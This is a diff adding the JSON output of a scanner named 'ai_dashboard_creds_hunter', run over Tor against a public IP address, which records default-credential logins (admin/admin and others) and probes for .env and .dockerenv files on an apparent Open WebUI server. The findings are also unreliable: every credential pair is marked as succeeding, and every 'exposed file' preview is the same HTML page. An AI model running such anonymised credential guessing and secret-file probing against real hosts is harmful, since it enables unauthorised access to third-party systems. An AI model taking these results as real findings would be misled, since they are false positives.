@@ -1,0 +1,152 @@
+{
+  "scan_date": "2026-06-02T21:54:23.361312Z",
+  "scanner": "ai_dashboard_creds_hunter v1.0",
+  "opsec": "Tor SOCKS5 (127.0.0.1:9050)",
+  "targets_scanned": 5,
+  "vulnerabilities": [
+    {
+      "severity": "CRITICAL",
+      "type": "default_credentials",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000",
+      "username": "admin",
+      "password": "admin",
+      "auth_bypass": true,
+      "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+    },
+    {
+      "severity": "CRITICAL",
+      "type": "default_credentials",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000",
+      "username": "admin",
+      "password": "grafana",
+      "auth_bypass": true,
+      "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+    },
+    {
+      "severity": "CRITICAL",
+      "type": "default_credentials",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000",
+      "username": "admin",
+      "password": "password",
+      "auth_bypass": true,
+      "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+    },
+    {
+      "severity": "CRITICAL",
+      "type": "default_credentials",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000",
+      "username": "viewer",
+      "password": "viewer",
+      "auth_bypass": true,
+      "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+    },
+    {
+      "severity": "CRITICAL",
+      "type": "default_credentials",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000",
+      "username": "editor",
+      "password": "editor",
+      "auth_bypass": true,
+      "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+    }
+  ],
+  "info_findings": [
+    {
+      "url": "http://207.244.225.101:3000",
+      "service": "grafana",
+      "status_code": 200,
+      "title": "Open WebUI",
+      "fingerprint_hits": [],
+      "server_header": "uvicorn",
+      "content_length": 7225,
+      "api_status": 200,
+      "api_response_preview": "<!doctype html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon.png\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon-96x96.png\" sizes=\"96x96\" />\n\t\t<link rel=\"icon\" type=\"image/svg+xml\" href=\"/static/favicon.svg\" />\n\t\t<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" />\n\t\t<link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/static/apple-touch-icon.png\" />\n\t\t<meta name=\"apple-mobile-web-app-title\" content=\"Open WebUI\" />\n",
+      "api_accessible": true,
+      "default_creds_found": [
+        {
+          "username": "admin",
+          "password": "admin",
+          "auth_bypass": true,
+          "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+        },
+        {
+          "username": "admin",
+          "password": "grafana",
+          "auth_bypass": true,
+          "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+        },
+        {
+          "username": "admin",
+          "password": "password",
+          "auth_bypass": true,
+          "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+        },
+        {
+          "username": "viewer",
+          "password": "viewer",
+          "auth_bypass": true,
+          "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+        },
+        {
+          "username": "editor",
+          "password": "editor",
+          "auth_bypass": true,
+          "evidence": "Basic auth successful on /api/admin/settings (status 200)"
+        }
+      ]
+    }
+  ],
+  "exposed_files": [
+    {
+      "severity": "HIGH",
+      "type": "exposed_file",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000/.env",
+      "path": "/.env",
+      "content_length": 7225,
+      "content_preview": "<!doctype html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon.png\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon-96x96.png\" sizes=\"96x96\" />\n\t\t<link rel=\"icon\" type=\"image/svg+xml\" href=\"/static/favicon.svg\" />\n\t\t<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" />\n\t\t<link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/static/apple-touch-icon.png\" />\n\t\t<meta name=\"apple-mobile-web-app-title\" content=\"Open WebUI\" />\n"
+    },
+    {
+      "severity": "HIGH",
+      "type": "exposed_file",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000/.env.local",
+      "path": "/.env.local",
+      "content_length": 7225,
+      "content_preview": "<!doctype html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon.png\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon-96x96.png\" sizes=\"96x96\" />\n\t\t<link rel=\"icon\" type=\"image/svg+xml\" href=\"/static/favicon.svg\" />\n\t\t<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" />\n\t\t<link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/static/apple-touch-icon.png\" />\n\t\t<meta name=\"apple-mobile-web-app-title\" content=\"Open WebUI\" />\n"
+    },
+    {
+      "severity": "HIGH",
+      "type": "exposed_file",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000/.env.production",
+      "path": "/.env.production",
+      "content_length": 7225,
+      "content_preview": "<!doctype html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon.png\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon-96x96.png\" sizes=\"96x96\" />\n\t\t<link rel=\"icon\" type=\"image/svg+xml\" href=\"/static/favicon.svg\" />\n\t\t<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" />\n\t\t<link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/static/apple-touch-icon.png\" />\n\t\t<meta name=\"apple-mobile-web-app-title\" content=\"Open WebUI\" />\n"
+    },
+    {
+      "severity": "HIGH",
+      "type": "exposed_file",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000/.env.development",
+      "path": "/.env.development",
+      "content_length": 7225,
+      "content_preview": "<!doctype html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon.png\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon-96x96.png\" sizes=\"96x96\" />\n\t\t<link rel=\"icon\" type=\"image/svg+xml\" href=\"/static/favicon.svg\" />\n\t\t<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" />\n\t\t<link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/static/apple-touch-icon.png\" />\n\t\t<meta name=\"apple-mobile-web-app-title\" content=\"Open WebUI\" />\n"
+    },
+    {
+      "severity": "MEDIUM",
+      "type": "exposed_file",
+      "service": "grafana",
+      "url": "http://207.244.225.101:3000/.dockerenv",
+      "path": "/.dockerenv",
+      "content_length": 7225,
+      "content_preview": "<!doctype html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon.png\" />\n\t\t<link rel=\"icon\" type=\"image/png\" href=\"/static/favicon-96x96.png\" sizes=\"96x96\" />\n\t\t<link rel=\"icon\" type=\"image/svg+xml\" href=\"/static/favicon.svg\" />\n\t\t<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" />\n\t\t<link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/static/apple-touch-icon.png\" />\n\t\t<meta name=\"apple-mobile-web-app-title\" content=\"Open WebUI\" />\n"
+    }
+  ],
+  "exit_ip": "5.45.102.93"
+}
